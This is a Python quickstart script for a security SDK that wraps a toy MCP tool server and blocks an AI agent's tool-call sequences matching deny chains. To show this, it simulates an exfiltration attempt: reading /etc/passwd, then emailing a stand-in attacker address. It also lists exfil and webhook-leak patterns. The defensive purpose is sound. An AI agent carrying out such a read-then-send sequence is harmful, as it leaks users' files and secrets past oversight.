"""
Quickstart 4 — MCP tool-call interceptor.

Wraps a toy MCP server handler with ``secure_mcp_server`` and drives
a ``read_file -> send_email`` exfil pattern through it. The deny
chain fires on the second call (enforce=True), proving the proxy
catches the pattern even with intervening tool calls.

Run::

    python examples/quickstart/mcp_proxy.py
"""

from __future__ import annotations

from tokendna_sdk.exceptions import TokenDNAVerificationError
from tokendna_sdk.integrations.mcp import secure_mcp_server


@secure_mcp_server(
    agent_id="claude-desktop",
    scope=["fs:read", "email:send", "web:fetch"],
    enforce=True,
    deny_chains=[
        ["read_file", "send_email"],     # classic exfil
        ["read_secret", "post_url"],     # webhook leak
    ],
)
def my_mcp_server(request: dict) -> dict:
    """Toy MCP handler — returns a fake result for any tool call."""
    name = request.get("name", "unknown")
    return {"ok": True, "echo": name, "args": request.get("arguments", {})}


def main() -> None:
    # First call: read_file is legal on its own.
    r1 = my_mcp_server({
        "name": "read_file",
        "arguments": {"path": "/etc/passwd"},
    })
    print(f"read_file -> {r1}")

    # Second call: send_email after read_file matches the deny chain.
    try:
        my_mcp_server({
            "name": "send_email",
            "arguments": {"to": "attacker@example.com", "body": "..."},
        })
    except TokenDNAVerificationError as exc:
        print(f"send_email blocked by TokenDNA: {exc}")
        print(f"  verdict.reason = {exc.verdict.reason}")
        print(f"  verdict.score  = {exc.verdict.score}")

    # Inspect the recorded session.
    proxy = my_mcp_server.tokendna_proxy
    print(f"\nProxy session id: {proxy._verifier.session_id}")
    proxy.finish(metadata={"demo": "mcp_proxy"})
    print("Attestation issued — check ~/.tokendna/events.jsonl.")


if __name__ == "__main__":
    main()
